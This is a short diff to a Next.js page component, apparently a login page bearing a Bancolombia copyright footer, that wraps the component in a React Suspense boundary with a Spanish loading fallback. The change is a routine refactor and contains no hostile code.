@@ -2,7 +2,7 @@
 
 import Image from 'next/image'
 import Link from 'next/link'
-import { useState, useEffect } from 'react'
+import { useState, useEffect, Suspense } from 'react'
 import { Open_Sans } from 'next/font/google'
 import { useRouter, useSearchParams } from 'next/navigation';
 import { Button } from "@/components/ui/button"
@@ -12,7 +12,8 @@ import { User } from "lucide-react"
 
 const openSans = Open_Sans({ subsets: ['latin'] })
 
-export default function Component() {
+function Component() {
+
   const [username, setUsername] = useState('');
   const [error, setError] = useState('');
   const router = useRouter();
@@ -28,7 +29,7 @@ export default function Component() {
     }, 1000)
     return () => clearInterval(timer)
   }, [])
-  
+
 
   const handleSubmit = (event) => {
     event.preventDefault();
@@ -154,5 +155,14 @@ export default function Component() {
         <p>Copyright ©️ 2024 Bancolombia S.A.</p>
       </footer>
     </div>
-  )
+  );
+}
+
+
+export default function ComponentPage() {
+  return (
+    <Suspense fallback={<div>Cargando...</div>}>
+      <Component />
+    </Suspense>
+  );
 }
